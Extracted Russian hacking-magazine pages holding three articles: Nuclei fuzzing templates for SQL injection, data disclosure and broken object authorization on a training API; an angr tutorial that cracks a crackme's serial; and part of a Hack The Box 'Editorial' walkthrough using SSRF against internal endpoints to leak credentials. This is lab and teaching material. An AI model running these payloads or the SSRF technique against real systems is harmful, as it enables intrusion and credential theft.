Подготовив OpenAPI, мы можем приступить к написанию кастомных шаб‐
лонов Nuclei для нашего приложения.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
    ПОТРОШИЛКА API
                ИСПОЛЬЗУЕМ NUCLEI
          И КАСТОМНЫЕ ШАБЛОНЫ ДЛЯ
                  ФАЗЗИНГА OPENAPI





ПИШЕМ КАСТОМНЫЕ ШАБЛОНЫ NUCLEI

Начнем с аутентификации. Регистрируем двух пользователей:


curl -X 'POST' \\
  'http://127.0.0.1:5002/users/v1/register' \\
  -H 'accept: application/json' \\
  -H 'Content-Type: application/json' \\
  -d '{
  "email": "alice@mail.com",
  "password": "alice",
  "username": "alice"
}'


{"message": "Successfully registered. Login to receive an auth token.
" , "status" : "success"}


curl -X 'POST' \\
  'http://127.0.0.1:5002/users/v1/register' \\
  -H 'accept: application/json' \\
  -H 'Content-Type: application/json' \\
  -d '{
  "email": "bob@mail.com",
  "password": "bob",
  "username": "bob"
}'


{"message": "Successfully registered. Login to receive an auth token.
" , "status" : "success"}

Логинимся от имени одного из них и получаем auth_token:


curl -X 'POST' \\
  'http://127.0.0.1:5002/users/v1/login' \\
  -H 'accept: application/json' \\
  -H 'Content-Type: application/json' \\
  -d '{
  "password": "bob",
  "username": "bob"
}'


{"auth_token" : "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJleHAiOjE3MjI5Njk4MzgsImlhdCI6MTcyMjk2OTc3OCwic3ViIjoiYWxpY2UifQ.
BkZug8W447WMpKWlbQv_GlgTePh8ROoIC0LlLwd_pJk" , "message":
"Successfully logged in." , "status" : "success"}

Составляем незамысловатый файл для аутентификации:


secrets.yaml
static:
  - type: bearertoken
    domains:
      - 127.0.0.1:5002
    token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJleHAiOjE3MjI5NDI2MjAsImlhdCI6MTcyMjk0MjU2MCwic3ViIjoiYm9iIn0.
gXjM40hPihDDrKFhOIuZCRjGsxWJamWjATGAynEoW6w

Наконец‑то можно приступить к шаблонам для уязвимостей.


Раскрытие информации
Напишем шаблон, который проверяет все конечные точки API на раскрытие
чувствительной информации.
  В нашем учебном примере уязвимость заключается в раскрытии паролей
пользователей. Чтобы обнаружить пароли в ответах, мы добавим матчер
с регулярным выражением.
   Также нужно задать условие, определяющее, какие эндпоинты подлежат
проверке. Нам нужны все, кроме /createdb, который отвечает за инициали‐
зацию базы и может поломать нам стенд.
   Чтобы сделать запрос на все подходящие эндпоинты, мы укажем part
фаззинга как path, а в качестве значения, которое будем фаззить, исполь‐
зуем пустую строку.


templates/disclosure.yaml
id: disclosure
info:
  name: disclosure
  author: test
  severity: high


http:
  - pre-condition:
      - type: dsl
        negative: true
        dsl:
          - 'contains(path,"createdb")'


    matchers:
      - type: regex
        regex:
        - '"password":\\s*".+"'
    stop-at-first-match: true


    fuzzing:
      - part: path
        mode: single
        type: postfix
        fuzz:
          - ""


SQL-инъекции
Следующим определим шаблон, который отвечает за поиск Error Based SQL-
инъекций. Подвергаем проверке фаззингом все параметры path, query
и body всех эндпоинтов API (кроме /createdb). В качестве матчера исполь‐
зуем регулярные выражения, которым могут соответствовать сообщения
об ошибках SQL.


templates/sqli.yaml
id: sqli
info:
  name: sqli
  author: test
  severity: critical
http:


  - pre-condition:
      - type: dsl
        negative: true
        dsl:
          - 'contains(path,"createdb")'


    matchers:
      - type: regex
        regex:
          - "SELECT"
          - "SQL"
        condition: or
    stop-at-first-match: true


    payloads:
      injection:
        - "'"
        - "\""
        - "`"


    fuzzing:
      - part: path
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"
      - part: body
        type: postfix
        mode: single
        fuzz:
          - "{{injection}}"


Уязвимость Broken Object Level Authorization
Проверим, правильно ли реализована авторизация. Может ли один поль‐
зователь получить неправомерный доступ к данным, принадлежащим дру‐
гому? Так как в выбранном тестовом стенде такая уязвимость встречается
в path-параметрах, здесь мы снова сталкиваемся с ограничением Nuclei,
о котором я упоминал выше. В случае с query или body таких проблем нет.
Но так как мы это уже предусмотрели, можем реализовать проверку и для
path-параметров тоже.
   Подготовим стенд, создав книгу от пользователя alice:


curl --location 'http://127.0.0.1:5002/books/v1' \\
--header 'Content-Type: application/json' \\
--header 'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJleHAiOjE3MjI5ODMwNTgsImlhdCI6MTcyMjk4Mjk5OCwic3ViIjoiYm9iIn0.
xDWXPKyfSEGtoIbQHI7Njd72byquLvg9f9RcRtU8ybM' \\
--data '{
"book_title": "alice_book",
"secret": "ALICE_SECRET"
}'


{
"message": "Book has been added." ,
"status" : "success"
}

Теперь напишем шаблон, который проверяет все path-параметры с названи‐
ем book_title на Broken Object Level Authorization, подставляя название кни‐
ги alice. Проверка при этом будет проводиться с аутентификацией от имени
bob.
   Особенность проверки path в том, что название параметра должно
задаваться в свойстве values, а также необходимо использовать type:
replace-regex, чтобы заменить только исследуемый параметр, а не весь
path.
  В качестве матчера задаем поиск заранее известного значения, которое
может быть доступно только пользователю alice.


templates/bola.yaml
id: bola
info:
  name: bola
  author: test
  severity: high


http:
  - matchers:
      - type: word
        words:
          - "ALICE_SECRET"


    fuzzing:
      - part: path
        type: replace-regex
        replace-regex: "book_title"
        mode: single
        values:
          - "book_title"
        fuzz:
          - "alice_book"


Сканируем стенд
Запустим Nuclei с подготовленной спецификацией OpenAPI, нашими кас‐
томными шаблонами фаззинга и аутентификацией на стенде. В файле аутен‐
тификации должен быть токен bob.


nuclei -l openapi.json -im openapi -t templates -secret-file secrets.
yaml





Видим, что каждый шаблон нашел уязвимости в API, на которые он был рас‐
считан.


NUCLEI В CI/CD

На этом возможности Nuclei не заканчиваются, современная разработка —
это непрерывный процесс, а значит, и проверки должны быть непрерывными!
 • Nuclei можно внедрить в пайплайн CI/CD GitLab или GitHub.
 • Он позволяет создавать отчеты и отправлять их в системы управления уяз‐
   вимостей.

Интеграция безопасности в CI/CD повышает защищенность разрабаты‐
ваемых приложений благодаря систематической проверке каждой сборки
или даже коммита. Кроме того, автоматизация позволяет сократить количес‐
тво рутинной работы и сосредоточиться на интересных и нетривиальных
задачах.


ВЫВОДЫ

С помощью кастомных шаблонов для фаззинга и настроенной аутентифика‐
ции мы быстро нашли реальные и опасные уязвимости.
   Основное достоинство описанного подхода в том, что мы проверяем API
тестируемого приложения таргетированно с учетом необходимого фор‐
мата запросов и не спотыкаемся о валидацию и авторизацию.
   Важный плюс в том, что мы можем заново использовать один раз написан‐
ные шаблоны для новых версий текущего приложения, а также применять
для других приложений со спецификацией OpenAPI.


        WWW

                         •Nuclei v3.2 Release with Authenticated Scanning,
                        Advanced Fuzzing & more
                         •Fuzzing for Unknown Vulnerabilities with Nuclei
                           v3.2
                       •Scanning  Login-Protected  Targets  with  Nuclei
                           v3.2
                         •Nuclei Overview
                           •Introduction to Nuclei Templates
ВЗЛОМ





Angr —  эмулятор  на  стероидах.  Он
кросс‑платформенный  и   поддерживает
большинство популярных архитектур: с ним
на Linux можно искать уязвимости в PE32,
а на Windows — ковырять прошивки роуте‐             mr.grogrig                                                                                            mr.grogrig@gmail.com
ров. В этой статье я на примере работы
в Linux покажу, как его использовать.


Символический эмулятор позволяет развернуть поиск дыр на 180 градусов.
Фаззинг, скажем, через AFL пробует все возможные входные данные. Angr
же, напротив, перебирает все возможные пути исполнения, воссоздавая
входные данные, при которых мы достигли интересующего нас участка кода.
   Например, возьмем код из моей статьи про Intel Pin:


#include <stdio.h>
#include <string.h>


int main(int argc, char* argv[])
{
    if (argc == 2)
    {
        if (strcmp(argv[1], "secret") == 0)
        {
            printf("You did it!\n");
        }
        else
        {
            printf("Better luck next time\n");
        }
    }
}

Полный перебор шести символов потребует 256 в 6-й степени попыток.
Для Angr есть всего одна развилка: пойти налево или направо. И он пойдет
и туда, и туда! Нам остается лишь сказать ему, в какой момент остановиться
и подсчитать входные данные.


import sys
import angr
import claripy


project = angr.Project('get_pass.bin')
arg = claripy.BVS('arg', 8*10)
initial_state = project.factory.entry_state(args=['./a.out', arg])
initial_state.options.add('SYMBOL_FILL_UNCONSTRAINED_MEMORY')


def is_successful(state):
    stdout_output = state.posix.dumps(sys.stdout.fileno())
    return b'You did it' in stdout_output


simulation = project.factory.simgr(initial_state)
simulation.explore(find=is_successful)


if simulation.found:
    solution_state = simulation.found[0]
    solution = solution_state.solver.eval(arg, cast_to=bytes).decode(
)
    print('Password:', solution)

Запустив скрипт, за секунду получаем искомый пароль.



  $ python angr_get_pass.py
  Password: secret


Не пересказывая всю документацию, объясню, что необходимо для старта.
   Первым делом ставим Angr (потребуется Python 3.8 или новее):


pip install angr

Angr спроектирован для работы из консоли. Документация зачастую не рас‐
крывает всех возможностей, так что советую изучать инструмент «живьем».
По каждому  объекту в интерактивном режиме можно получить  справку
из docstring командой help(project) (или project?, если у тебя iPython).
   Пользоваться справкой можно так же, как и man: управление — на стрел‐
ках, выход через q.
   Ну а смотреть поля и методы классов удобно через автодополнение:
допиши к названию класса точку и пару раз нажми Tab.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
 УПРАВЛЕНИЕ ГНЕВОМ
          ИЗУЧАЕМ ANGR — ФРЕЙМВОРК
          СИМВОЛИЧЕСКОЙ ЭМУЛЯЦИИ





ОСНОВНЫЕ КОНЦЕПЦИИ

Все начинается с класса Project, его создание — это начало взаимодей‐
ствия с Angr. Проект отвечает за загрузку и первичный анализ.
   Передаем путь до  исследуемого файла  и,  чтобы начать симуляцию
со   старта  программы,  создаем  новое  состояние  через  factory.
entry_state. Фабрика создает экземпляры основных классов. Состояние —
это объект SimState, фактически — снимок виртуальной машины. Он содер‐
жит блок кода, память, регистры, стек вызовов и другие вещи, реализуемые
как плагины к SimState.


initial_state.regs.rip
<BV64 0x401080>

Используемые в симуляции данные хранятся в битовом массиве bitvector.
Он строго ограничен по длине и может быть переполнен, то есть ведет себя
как процессорный регистр. Его размер всегда указывается в битах.
   Существует два основных типа: BVV (bit-vector value) и BVS (bit-vector
symbol). Первый представляет конкретные значения чисел. Второй содержит
только имя и размер. Это основа символического исполнения, конкретного
значения здесь нет.


Базовые блоки
Каждое состояние связано с конкретным блоком кода. Местный базовый
блок — это набор инструкций, который заканчивается командой передачи
управления. Каждый шаг эмуляции перемещает нас к следующему блоку, соз‐
давая новое состояние.
   Менеджер симуляции оперирует только адресами начала блоков, но не
кода внутри них. Если это не учитывать, менеджер не сможет найти нужное
состояние.


initial_state.block().pp()
       _start:
401080  endbr64
401084  xor     ebp, ebp
401086  mov     r9, rdx
401089  pop     rsi
40108a  mov     rdx, rsp
40108d  and     rsp, 0xfffffffffffffff0
401091  push    rax
401092  push    rsp
401093  xor     r8d, r8d
401096  xor     ecx, ecx
401098  lea     rdi, [main]
40109f  call    qword ptr [0x403fd8]

Это дизассемблированный базовый блок. Из его ассемблерных инструкций
создается промежуточный VEX-код. Можно сказать, что это код для виртуаль‐
ного процессора, с которым работают анализаторы.


initial_state.block().vex.pp()


IRSB {
  00 | ------ IMark(0x401080, 4, 0) ------
  01 | ------ IMark(0x401084, 2, 0) ------
  02 | PUT(rbp) = 0x0000000000000000
  03 | ------ IMark(0x401086, 3, 0) ------
  04 | t30 = GET:I64(rdx)
  05 | PUT(r9) = t30
  06 | PUT(rip) = 0x0000000000401089
  07 | ------ IMark(0x401089, 1, 0) ------
  08 | t4 = GET:I64(rsp)
  09 | t3 = LDle:I64(t4)
  10 | t31 = Add64(t4,0x0000000000000008)
  11 | PUT(rsi) = t3
  12 | ------ IMark(0x40108a, 3, 0) ------
  13 | PUT(rdx) = t31
  14 | ------ IMark(0x40108d, 4, 0) ------
  15 | t5 = And64(t31,0xfffffffffffffff0)
  16 | PUT(rip) = 0x0000000000401091
  17 | ------ IMark(0x401091, 1, 0) ------
  18 | t8 = GET:I64(rax)
  19 | t33 = Sub64(t5,0x0000000000000008)
  20 | PUT(rsp) = t33
  21 | STle(t33) = t8
  22 | PUT(rip) = 0x0000000000401092
  23 | ------ IMark(0x401092, 1, 0) ------
  24 | t35 = Sub64(t33,0x0000000000000008)
  25 | PUT(rsp) = t35
  26 | STle(t35) = t33
  27 | ------ IMark(0x401093, 3, 0) ------
  28 | PUT(r8) = 0x0000000000000000
  29 | ------ IMark(0x401096, 2, 0) ------
  30 | PUT(cc_op) = 0x0000000000000013
  31 | PUT(cc_dep1) = 0x0000000000000000
  32 | PUT(cc_dep2) = 0x0000000000000000
  33 | PUT(rcx) = 0x0000000000000000
  34 | ------ IMark(0x401098, 7, 0) ------
  35 | PUT(rdi) = 0x0000000000401169
  36 | PUT(rip) = 0x000000000040109f
  37 | ------ IMark(0x40109f, 6, 0) ------
  38 | t21 = LDle:I64(0x0000000000403fd8)
  39 | t51 = Sub64(t35,0x0000000000000008)
  40 | PUT(rsp) = t51
  41 | STle(t51) = 0x00000000004010a5
  42 | t53 = Sub64(t51,0x0000000000000080)
  43 | ====== AbiHint(0xt53, 128, t21) ======
  NEXT: PUT(rip) = t21; Ijk_Call
}

Промежуточный код представлен в Intermediate Representation Super-Block.
Посмотрим, из чего он состоит:
 • IMark показывает размер и адрес оригинальной инструкции;
 • PUT записывает значение в регистр;
 • GET:I64  получает  значение  регистра,  постфикс  указывает  размер
   в битах;
 • t30 — виртуальная переменная, сокращение от temp и ее номер;
 • LDle — Load in little-endian. Получает значение по адресу;
 • STle — Store in little-endian. Записывает значение по адресу;
 • Add64 — операция сложения;
 • Sub64 — операция вычитания;
 • And64 — операция логического И;
 • NEXT отображает переход к следующему блоку и его тип Ijk_Call.

Код оптимизирован, счетчик команд rip изменяется не у каждой инструкции.
   Вместо того чтобы хранить EFLAGS, промежуточный код записывает:
 • cc_op — код операции, проводимой над флагами;
 • cc_dep1, cc_dep2 и cc_ndep — вспомогательные значения.

Судя по исходникам, VEX, 0x13 — это X86G_CC_OP_DECB, то есть декремент
одного байта. Конкретные значения флагов вычисляются по мере необ‐
ходимости.


Управление симуляцией
Мы можем управлять симуляцией вручную. Что удобно для отладки.



  >>> next = initial_state.step()
  >>> type(next)
  <class 'angr.engines.successors.SimSuccessors'>


  >>> next.successors
  [<SimState @ 0x529dc0>]


Функция initial_state.step()  возвращает  объект SimSuccessors, он
содержит список состояний, которые возникают после эмуляции текущего
блока.
   Если в конце блока встречается развилка (условный переход), создается
два новых состояния. Это происходит, когда выбор пути зависит от сим‐
волической переменной. Если переход зависит только от известных зна‐
чений, возможен лишь один выбор, что равносильно безусловному переходу.
   Менеджер   симуляции   руководит   исполнением   кода.   Объект
SimulationManager  создается  в  project.factory.simgr.  Фактически
это удобная обертка, в цикле запускающая step(). Она решает, в каких вет‐
ках продолжать, а в каких прекращать эмуляцию.
  По ходу исполнения все состояния складываются в специальные «ящики»:


simulation.stashes


defaultdict(list,
{'active': [],
'stashed': [<SimState @ 0x401080>],
'pruned': [],
'unsat': [],
'errored': [],
'deadended': [],
'unconstrained': []})

Stashes — словарь из обычных питоньих списков. Состояния до запуска
лежат в stashed, во время симуляции — в active, по завершении кода —
в deadended. Это не полный перечень, и ты тоже можешь создавать ящики
под свои нужды.
   Запуская симуляцию через simulation.explore, можно передавать аргу‐
менты:
 • find принимает адрес искомого состояния или функцию для проверки
   каждого;
 • avoid аналогично, но для адресов, которых следует избегать.

Следующие аргументы принадлежат simulation.step, но их можно переда‐
вать в simulation.explore. Об этом нигде явно не сказано, так что советую
читать исходники.
 • step_func вызывается после каждого шага, полезна для отладки;
 • filter_func — говорим, в какой ящик поместить найденное состояние;
 • selector_func спрашивает, стоит ли исполнять текущее состояние.

Симуляция заканчивается, если найдено состояние из find или код из всех
веток завершился. Тогда simulation.explore возвращает управление. Если
искомое состояние найдено, оно помещается в ящик found.
  Для наглядности слегка изменим код:


def next_step(simulation):
    print({k: v for k, v in simulation.stashes.items() if v})
    return simulation


simulation = project.factory.simgr(initial_state)
simulation.explore(find=is_successful, step_func=next_step)

И увидим состояния на каждом шаге:


{'active': [<SimState @ 0x529dc0>]}
{'active': [<SimState @ 0x401169>]}
{'active': [<SimState @ 0x401182>]}
{'active': [<SimState @ 0x401070>]}
{'active': [<SimState @ 0x5a82e0>]}
{'active': [<SimState @ 0x40119f>]}
{'active': [<SimState @ 0x4011a3>, <SimState @ 0x4011b4>]}
{'active': [<SimState @ 0x401060>, <SimState @ 0x401060>]}
{'active': [<SimState @ 0x580e50>, <SimState @ 0x580e50>]}
{'active': [<SimState @ 0x4011b2>, <SimState @ 0x4011c3>]}
{'active': [<SimState @ 0x4011d4>], 'found': [<SimState @ 0x4011b2>]}

На развилке эмулятор пошел в обе стороны. И закончил работу, наполнив
ящик found.


Автоматический выбор путей
Обычный explore идет «вширь», помещая все развилки в ящик на одновре‐
менное исполнение. Однако циклы и развилки создают множество воз‐
можных маршрутов, что может привести к взрывному росту количества путей.
Для  решения   этой   проблемы   можно   использовать  exploration
techniques — стратегии поиска, которые решают, куда и в каком порядке
идти.


simulation.use_technique(angr.exploration_techniques.DFS())

Техника Depth  first search работает только с одним состоянием за раз,
помещая остальные в очередь. В роли очереди — ящик deferred.


simulation.use_technique(angr.exploration_techniques.LengthLimiter(10
))

Эта техника поиска ограничивает максимальную глубину эмуляции для каж‐
дого пути. И таким образом проводит быструю, но поверхностную эмуляцию.
   Готовых техник немало, но они плохо документированы, так что смотри ис‐
ходники.


Символическое исполнение
Вычисление  символических  переменных  производится  библиотекой Z3.
Как мы уже знаем, символические переменные не содержат конкретных зна‐
чений. Эмулятору известен только их размер и ограничения, накладываемые
по ходу исполнения. Например, создадим переменную x размером 64 бита
и добавим ограничение x + 2 == 5.


x = state.solver.BVS('x', 64)
state.solver.add(x + 2 == 5)
state.solver.eval(x)

Попросив вычислить возможное решение, получаем в ответ 0x3. Такие же
ограничения накладываются на символические переменные после каждого
блока. Для примера рассмотрим простое ветвление.


void test(int var)
{
    if(var > 5)
    {
        printf("A");
    }
    else
    {
        printf("B");
    }
}

Подсмотрев адрес в отладчике, эмулируем начало этой функции. Передаем
аргумент через подмену EDI, поместив в него символическую переменную
длиной 32 бита.


state = project.factory.blank_state(addr=0x401149)


state.regs.edi = claripy.BVS('func_arg', 32)
state_left, state_right = state.step().successors


print('Left:', state_left.solver.constraints)
print('Right:', state_right.solver.constraints)

Видим ограничения: чтобы пойти налево, переменная должна быть меньше
или равна пяти.



  Left: [<Bool (0x0 .. func_arg_49_8) <=s 0x5>]
  Right: [<Bool (0x0 .. func_arg_49_8) >s 0x5>]


Для сравнения попробуем передать конкретное значение.


state.regs.edi = claripy.BVV(1337, 32)


print(state.step().successors)
print('Constraints:', state.step().successors[0].solver.constraints)

Разумеется, 1337 больше, чем 5. В таком случае возможный переход будет
всего один и без ограничений.



  [<SimState @ 0x40115e>]
  Constraints: []


Символические функции также накладывают свои ограничения, но понять их
нелегко.



  >>> solution_state.solver.constraints


  <Bool strlen_51_64 == 0x6 && (arg_48_80[79:72] == 115 || strlen_51_64 <
  0x0) && (arg_48_80[71:64] == 101 || strlen_51_64 < 0x1) && (arg_48_80[
  63:56] == 99 || strlen_51_64 < 0x2) && (arg_48_80[55:48] == 114 ||
  strlen_51_64 < 0x3) && (arg_48_80[47:40] == 101 || strlen_51_64 < 0x4)
  && (arg_48_80[39:32] == 116 || strlen_51_64 < 0x5) && strncmp_ret_52_32{
  UNINITIALIZED} == 0x0 || !(strlen_51_64 == 0x6 && (arg_48_80[79:72] ==
  115 || strlen_51_64 < 0x0) && (arg_48_80[71:64] == 101 || strlen_51_64 <
  0x1) && (arg_48_80[63:56] == 99 || strlen_51_64 < 0x2) && (arg_48_80[55:
  48] == 114 || strlen_51_64 < 0x3) && (arg_48_80[47:40] == 101 ||
  strlen_51_64 < 0x4) && (arg_48_80[39:32] == 116 || strlen_51_64 < 0x5))
  && strncmp_ret_52_32{UNINITIALIZED} == 0x1>


Достаточно знать, что это математическая формула, для которой будет най‐
дено возможное решение.


Символические функции
Код приложения подвергается эмуляции, но что происходит с внешними
модулями?  Angr через  хуки  подменяет вызовы  библиотечных  функций
питоновскими заглушками SimProcedures, симулирующими выполнение нуж‐
ных функций. То же самое происходит при вызове syscall. Если заглушка
не найдена, выполняется стандартная заглушка ReturnUnconstrained.
  По умолчанию все внешние функции перехватываются. Поведение Angr
несложно настроить при создании проекта. Отдельные функции или весь
внешний код можно эмулировать, но это плохо сказывается на произво‐
дительности.
   Посмотрим список установленных хуков.


>>> for addr, proc in project._sim_procedures.items():
>>>     print(hex(addr), proc.display_name)


0x529dc0 __libc_start_main
0x580e50 puts
0x5a82e0 strcmp
0x8181d0 __tls_get_addr
0x900000 LinuxLoader
# (...)

Готовые заглушки наследуют класс SimProcedure, примеры в исходниках.


class puts(angr.SimProcedure):


    def run(self, string):
        stdout = self.state.posix.get_fd(1)
        if stdout is None:
            return -1


        strlen = angr.SIM_PROCEDURES["libc"]["strlen"]
        length = self.inline_call(strlen, string).ret_expr
        out = stdout.write(string, length)
        stdout.write_data(self.state.solver.BVV(b"\n"))
        return (out + 1)[31:0]

Хуки можно установить, указав адрес:


project.hook(0x401000, my_stub())

Или имя символа:


project.hook_symbol('fgets', my_fgets())

В Angr символы связывают имена с конкретными адресами. Они создаются
во время загрузки исполняемого файла.



  print(project.loader.find_symbol('printf'))


  <Symbol "printf" in libc.so.6 at 0x5606f0>


Ради любопытства можно посмотреть их все:


for item in project.loader.symbols: print(item)

Например, эти взяты из дебаг‑символов ELF-файла:


<Symbol "_start" in get_pass at 0x401080>
<Symbol "main" in get_pass at 0x401169>
<Symbol "_fini" in get_pass at 0x4011dc>


ВОССТАНОВЛЕНИЕ СЕРИЙНОГО НОМЕРА

Чтобы все было по‑честному, возьмем реальный crackme для Windows.



  $ wine SerialGen.exe


  "SerialGen" crackme by DosX


  USERNAME   >>> user
  SERIAL KEY >>> password


  [-] Wrong serial. License is expired :(


Задача состоит в том, чтобы получить серийный номер для конкретного име‐
ни  пользователя. Восстановив псевдокод в Binary Ninja, видим размер
буфера и метод ввода.


int32_t var_c = 1;
printf("\n    "SerialGen" crackme by Dos…");
char* eax = malloc(0x20);
fgets(eax, 0x20, _iob);
eax[(strlen(eax) - var_c)] = 0;


if (strlen(eax) != i_1)
{
    printf(" SERIAL KEY >>> ");
    char* eax_7 = malloc(0x20);
    fgets(eax_7, 0x20, _iob);
    eax_7[(strlen(eax_7) - var_c)] = 0;

Функция fgets получает обе строки в буфер длиной 0x20 байт. От них берет‐
ся размер, и последний байт заменяется нулем. Настоящий fgets возвра‐
щает строку с двумя байтами на конце — символом переноса строки и нулем.
Запоминаем адреса блоков, выводящих сообщения об успехе и неудаче.


import sys
import angr


username = 'xakep.ru'


path_to_binary = "./SerialGen.exe"
project = angr.Project(path_to_binary)


initial_state = project.factory.entry_state(
    add_options={
        angr.options.SYMBOL_FILL_UNCONSTRAINED_MEMORY,
        angr.options.SYMBOL_FILL_UNCONSTRAINED_REGISTERS,
    }
)


old_hook = project.symbol_hooked_by('fgets')


class FgetsHook(angr.SimProcedure):
    def run(self, str_addr, count, stream):
        self.state.memory.store(str_addr, username.encode() + b'\n\
x00')
        self.project.hook_symbol('fgets', old_hook, replace=True)


project.hook_symbol('fgets', FgetsHook(), replace=True)
simulation = project.factory.simgr(initial_state)
simulation.explore(find=0x004012e3, avoid=0x004012fa)


if simulation.found:
    solution_state = simulation.found[0]
    solution = solution_state.posix.dumps(sys.stdin.fileno()).decode(
)
    print(username, solution.upper())

Символические переменные не указаны явно, по умолчанию стандартный
поток ввода реализуется как SimPacketsStream. Его можно рассматривать
как набор переменных, создаваемых по мере необходимости.



  >>> solution_state.posix.stdin.content


  [(<BV248 packet_0_stdin_4_248>, <BV32 0x1f>)]


Чтобы передать имя пользователя, заменяем исходный хук fgets своим,
в котором возвращаем желаемую строку в обход STDIN. Как только наш хук
срабатывает, восстанавливаем старый. Подменять результаты функций удоб‐
нее, чем поток ввода. Как только менеджер симуляции находит блок с адре‐
сом 0x004012e3, конкретизируем значение STDIN через posix.dumps.



  $ python crackme.py
  xakep.ru SERIAL-00E19-01147-03D9A-11620


  $ wine SerialGen.exe


  "SerialGen" crackme by DosX


  USERNAME   >>> xakep.ru
  SERIAL KEY >>> SERIAL-00E19-01147-03D9A-11620


  [+] Welcome, xakep.ru! :)


Решение выглядит простым, но я потратил кучу времени на отладку. Во‑пер‐
вых, не сразу заметил, что fgets сохраняет перенос строки. Во‑вторых,
sprintf из Angr возвращает строчку в нижнем регистре, а sprintf из Wine —
в верхнем. Проверив код в Windows, убеждаемся, что Wine был прав. Я уже
зарепортил этот баг. Как видишь, даже оригинальные стабы Angr могут
содержать ошибки.


ВЫВОДЫ

Angr — на удивление мощный инструмент, однако у символического исполне‐
ния есть свои ограничения. За пару минут мне удалось «взломать» ключ
от CRC32, но формула для восстановления данных из хеша MD5 оказалась
не под силу Z3.
   Разумеется, Angr не может симулировать большие приложения. Но если
мы нашли в программе слабую  точку, он поможет подобрать  данные,
без которых до нее не доберется ни один фаззер.
  Мы познакомились лишь с некоторыми возможностями Angr. В следующей
статье будет множество примеров, полезных для поиска и эксплуатации най‐
денных уязвимостей.
ВЗЛОМ





Сегодня я покажу пример подделки зап‐
росов на  стороне  сервера  (SSRF). Мы
получим доступ к внутрянке сайта и извле‐
чем критически важные данные, затем най‐
дем данные технической учетной записи             RalfHacker                                                                                             hackerralf8@gmail.com
и повысим привилегии в Linux через уяз‐
вимость в библиотеке GitPython.


Наша цель — получение прав суперпользователя на машине Editorial с учеб‐
ной площадки Hack The Box. Уровень задания — легкий.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.20    editorial.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.9p1;
 • 80 — веб‑сервер Nginx 1.18.0.

Идем смотреть, что там на веб‑сервере.





                           Главная страница сайта


ТОЧКА ВХОДА

На сайте находим форму для отправки информации о книге.





                      Содержимое страницы Upload

В форме есть поля для URL и загрузки файла. Если сервер будет обращаться
к указанному нами URL, обязательно нужно проверить, нет ли тут уязвимости
SSRF. Давай выполним запрос на свой сервер, для чего у себя запустим лис‐
тенер:


nc -nlvp 8000

И укажем адрес нашей машины в поле URL. Остальные поля для начала
заполним тестовыми данными.





                      Содержимое страницы Upload

После отправки запроса страница обновляется, но в логах листенера пусто.
Просматриваем запрос в Burp History и не находим там указанного URL.





                           Запрос в Burp History

Вернемся к форме на сайте, снова заполним ее данными, но в этот раз
не будем их отправлять, а нажмем кнопку Preview. В этот момент на листенер
приходит запрос от сервера.





                            Запрос на сервер





                                 Логи листенера

А теперь ради эксперимента в поле URL вместо своего листенера указыва‐
ем 127.0.0.1. В ответ получаем какой‑то путь.





                   Запрос и ответ сервера в Burp History

Уязвимость SSRF на сайте явно есть, а значит, попытаемся ее раскрутить.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       HTB EDITORIAL
             ИСПОЛЬЗУЕМ SSRF И БАГ
        В GITPYTHON, ЧТОБЫ ЗАХВАТИТЬ
                            СЕРВЕР





ТОЧКА ОПОРЫ

Так как мы можем получить доступ к внутренним ресурсам, попробуем найти
еще какие‑нибудь внутренние сервисы. Для этого пробрутим порты в отправ‐
ляемом URL через Burp Intruder.





                    Burp Intruder — вкладка Positions





                    Burp Intruder — вкладка Payloads

После окончания перебора фильтруем результаты по размеру ответа. Видим,
что один из ответов отличается, а значит, сервис работает на порте 5000.





                   Burp Intruder — результат перебора

Комбинацией клавиш Ctrl-R пересылаем запрос в Burp Repeater и проверя‐
ем ответ. В ответе получаем уже другой путь, на этот раз файл в каталоге
с загрузками.





                                 Ответ сервера

Переходим по полученному URI в браузере и в истории запросов видим, что
мы можем посмотреть содержимое файла.





                                 Ответ сервера

Данные представлены в формате JSON, поэтому копируем их в файл и прос‐
матриваем с помощью утилиты jq.





                     Содержимое скачанного файла

Файл раскрывает нам несколько эндпоинтов API. По описанию каждого API
можно понять, за что отвечает функция. Получим сообщения от авторов,
для чего через SSRF выполним запрос к такому эндпоинту:


http://127.0.0.1:5000/api/latest/metadata/messages/authors





                                 Ответ сервера

Снова скачиваем файл и красиво выводим через jq.



                     Содержимое скачанного файла

В большом сообщении от автора раскрываются учетные данные записи dev.
Успешно подключаемся от ее имени к серверу по SSH и получаем первый
флаг.





                       Флаг пользователя


ПРОДВИЖЕНИЕ

Теперь нам необходимо собрать информацию. Я буду использовать для это‐
го скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
